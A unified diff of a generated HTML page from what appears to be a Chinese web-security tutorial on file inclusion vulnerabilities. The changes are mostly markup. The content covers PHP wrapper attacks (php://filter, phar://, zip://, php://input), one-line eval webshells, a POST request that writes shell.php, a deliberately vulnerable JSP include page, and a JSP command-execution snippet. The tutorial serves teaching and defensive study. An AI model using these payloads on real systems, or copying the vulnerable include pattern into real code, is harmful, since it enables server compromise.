-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">192.168.109.139 - - [11/Sep/2022 12:16:08] &#34;GET /1.html HTTP/1.0&#34; 200 -
-</code></pre></div><h2 id="技巧php伪协议">技巧:PHP伪协议</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.109.139 - - [11/Sep/2022 12:16:08] &#34;GET /1.html HTTP/1.0&#34; 200 -
+</span></span></code></pre></div><h2 id="技巧php伪协议">技巧:PHP伪协议</h2>
 <h3 id="php-输入输出流">php:// 输入输出流</h3>
 <p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
 <blockquote>
@@ -679,10 +679,10 @@
 <p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
 </blockquote>
 <h4 id="用法">用法</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">php://filter/read=convert.base64-encode/resource=你要读取的东西
-</code></pre></div><h4 id="过程">过程</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip/path/include.php?filename=php://filter/read=convert.base64-encode/resource=你要读取的东西
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/read=convert.base64-encode/resource=你要读取的东西
+</span></span></code></pre></div><h4 id="过程">过程</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip/path/include.php?filename=php://filter/read=convert.base64-encode/resource=你要读取的东西
+</span></span></code></pre></div><blockquote>
 <p>如果在某些场合发现明明存在文件包含漏洞但是某些东西无法读取的话，</p>
 <p>可以base64编码解决</p>
 </blockquote>
@@ -717,8 +717,8 @@
 <h3 id="phar伪协议">phar://伪协议</h3>
 <p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
 <h4 id="用法-1">用法</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">?file=phar://压缩包/内部文件
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=phar://压缩包/内部文件
+</span></span></code></pre></div><blockquote>
 <p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
 </blockquote>
 <h4 id="过程-1">过程</h4>
@@ -750,12 +750,12 @@
 ></p>
 <p>同理，也可以通过这种思路进行getshell,</p>
 <p>将php文件中的phpinfo的代码改为一句话木马即可</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><h3 id="zip伪协议">zip伪协议</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h3 id="zip伪协议">zip伪协议</h3>
 <p>zip伪协议和phar协议类似，但是用法不一样。</p>
 <h4 id="用法-2">用法</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">file=zip://[压缩文件]#[压缩文件内的子文件名]
-</code></pre></div><h4 id="条件-2">条件</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=zip://[压缩文件]#[压缩文件内的子文件名]
+</span></span></code></pre></div><h4 id="条件-2">条件</h4>
 <p>PHP &gt; =5.3.0</p>
 <blockquote>
 <p>注意在windows下测试要PHP=5.3.0</p>
@@ -763,8 +763,8 @@
 </blockquote>
 <h4 id="过程-2">过程</h4>
 <p>依旧是先上传，再利用文件包含漏洞进行解析</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip/path/include.php?filename=zip://info.jpg%23info.php
-</code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip/path/include.php?filename=zip://info.jpg%23info.php
+</span></span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08.png"
 	width="830"
 	height="669"
 	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_1024x0_resize_box_3.png 1024w"
@@ -780,22 +780,22 @@
 <h3 id="phpinput">php://input</h3>
 <p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
 <h4 id="用法-3">用法</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">?file=php://input
-</code></pre></div><p>数据利用POST传过去。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://input
+</span></span></code></pre></div><p>数据利用POST传过去。</p>
 <h4 id="条件-3">条件</h4>
 <p>php配置文件中需同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p>
 <h4 id="过程-3">过程</h4>
 <p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><blockquote>
 <p>注意:当前目录Web应用工作的用户必须要<strong>有写权限</strong>,否则写不了</p>
 </blockquote>
 <p>发送POST包</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/test/include.php?filename=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="err">...</span>
-<span class="g">...
-</span><span class="g">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
-</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/test/include.php?filename=php://input</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span><span class="line"><span class="cl"><span class="g">...
+</span></span></span><span class="line"><span class="cl"><span class="g">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
+</span></span></span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6.png"
 	width="1187"
 	height="502"
 	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_1024x0_resize_box_3.png 1024w"
@@ -950,36 +950,36 @@
 <p>在目标机器上起一个Tomcat环境</p>
 <p>新建一个<code>test.jsp</code>,</p>
 <p>输入以下代码搭建一个简单的javaweb文件包含漏洞环境</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--输出提示--&gt;</span>
-<span class="err">&lt;</span>%out.println(&#34;Input your payload as GET parameter &#39;payload&#39;&#34;);%&gt;
-<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-<span class="err">&lt;</span>%out.println(&#34;Output: &#34;);%&gt;
-<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-<span class="c">&lt;!--获取payload参数内容传入变量payload--&gt;</span>
-<span class="err">&lt;</span>%String payload = request.getParameter(&#34;payload&#34;);%&gt;
-<span class="c">&lt;!--包含变量payload内的内容--&gt;</span>
-<span class="p">&lt;</span><span class="nt">jsp:include</span> <span class="na">page</span><span class="o">=</span><span class="s">&#34;${param.payload}&#34;</span> <span class="p">/&gt;</span>
-</code></pre></div><h4 id="玩法">玩法</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!--输出提示--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>%out.println(&#34;Input your payload as GET parameter &#39;payload&#39;&#34;);%&gt;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>%out.println(&#34;Output: &#34;);%&gt;
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--获取payload参数内容传入变量payload--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>%String payload = request.getParameter(&#34;payload&#34;);%&gt;
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--包含变量payload内的内容--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">jsp:include</span> <span class="na">page</span><span class="o">=</span><span class="s">&#34;${param.payload}&#34;</span> <span class="p">/&gt;</span>
+</span></span></code></pre></div><h4 id="玩法">玩法</h4>
 <p>给payload参数传你想要包含的路径</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip:8080/path/test.jsp?payload=文件名
-</code></pre></div><h4 id="测试">测试</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip:8080/path/test.jsp?payload=文件名
+</span></span></code></pre></div><h4 id="测试">测试</h4>
 <p>在<code>test.jsp</code>的相同目录新建一个<code>1.jsp</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="err">&lt;</span>%@ page import=&#34;java.util.*,java.io.*&#34;%&gt;
-<span class="err">&lt;</span>%
-Process p;
-p = Runtime.getRuntime().exec(&#34;操作系统命令&#34;);
-OutputStream os = p.getOutputStream();
-InputStream in = p.getInputStream();
-DataInputStream dis = new DataInputStream(in);
-String disr = dis.readLine();
-while ( disr != null ) {
-   out.println(disr);
-   disr = dis.readLine();
-}
-%&gt;
-</code></pre></div><p>然后访问</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://ip:8080/path/test.jsp?payload=1.jsp
-</code></pre></div><p>让1.jsp被包含</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="err">&lt;</span>%@ page import=&#34;java.util.*,java.io.*&#34;%&gt;
+</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>%
+</span></span><span class="line"><span class="cl">Process p;
+</span></span><span class="line"><span class="cl">p = Runtime.getRuntime().exec(&#34;操作系统命令&#34;);
+</span></span><span class="line"><span class="cl">OutputStream os = p.getOutputStream();
+</span></span><span class="line"><span class="cl">InputStream in = p.getInputStream();
+</span></span><span class="line"><span class="cl">DataInputStream dis = new DataInputStream(in);
+</span></span><span class="line"><span class="cl">String disr = dis.readLine();
+</span></span><span class="line"><span class="cl">while ( disr != null ) {
+</span></span><span class="line"><span class="cl">   out.println(disr);
+</span></span><span class="line"><span class="cl">   disr = dis.readLine();
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></div><p>然后访问</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip:8080/path/test.jsp?payload=1.jsp
+</span></span></code></pre></div><p>让1.jsp被包含</p>
 <p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233.png"
 	width="1128"
 	height="259"
@@ -1135,11 +1135,11 @@ while ( disr != null ) {
             
                 
 <article class="has-image">
-    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/">
         
         
             <div class="article-image">
-                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.f63b69aa4f4219156654b595210bbc9d_hu337d2e493e824d835754f79e3b77496e_3809477_250x150_fill_q75_box_smart1.jpg" 
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8--%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.f63b69aa4f4219156654b595210bbc9d_hu337d2e493e824d835754f79e3b77496e_3809477_250x150_fill_q75_box_smart1.jpg" 
                         width="250" 
                         height="150" 
                         loading="lazy"
